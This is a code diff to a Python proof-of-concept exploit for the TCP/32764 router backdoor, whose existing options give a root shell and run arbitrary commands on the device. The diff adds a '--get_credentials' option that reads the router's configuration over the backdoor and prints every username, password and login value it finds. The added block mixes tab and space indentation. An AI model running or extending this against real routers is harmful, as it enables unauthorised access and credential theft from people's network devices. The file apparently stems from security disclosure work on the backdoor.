@@ -3,6 +3,7 @@ import socket
 import struct
 import sys
 import argparse
+import re
 
 parser = argparse.ArgumentParser(description='PoC for the TCP/32764 backdoor.\n'\
 	'see https://github.com/elvanderb/TCP-32764 for more details')
@@ -14,6 +15,7 @@ command_group.add_argument('--is_vuln', help='tells you if the router is vulnera
 command_group.add_argument('--shell', help='gives you a root shell on the router', action="store_true")
 command_group.add_argument('--execute', type=str, nargs='?', help='run a command and dump straight to stdout', default='')
 command_group.add_argument('--print_conf', help='pretty print router\'s configuration', action="store_true")
+command_group.add_argument('--get_credentials', help='gets credentials', action="store_true")
 command_group.add_argument('--get_var', type=str, nargs='?', metavar='var_name', help='get router\'s configuration variable')
 command_group.add_argument('--set_var', type=str, nargs='?', metavar='var_name=val', help='set router\'s configuration variable')
 command_group.add_argument('--message', type=int, nargs='?', help='message to send', choices=range(1, 14))
@@ -88,6 +90,22 @@ elif args.print_conf :
 	conf = conf.replace("\x00", "\n")
 	conf = conf.replace("\x01", "\n\t")
 	print(conf)
+elif args.get_credentials :
+	conf = send_message(s, endianness, 1)[1]
+        lines = re.split("\x00|\x01", conf)
+        pattern = re.compile('user(name)?|password|login');
+        credentials = []
+        for line in lines:
+            try:
+                (var, value) = line.split("=")
+                if len(value)>0 and pattern.search(var):
+                    credentials += [[var, value]]
+            except ValueError:
+                pass
+        credentials.sort()
+        for var, value in credentials:
+            print("{}:{}".format(var, value))
+
 elif args.get_var is not None :
 	response = send_message(s, endianness, 2, args.get_var)[1].rstrip("\x00")
 	if len(response) == 0 :
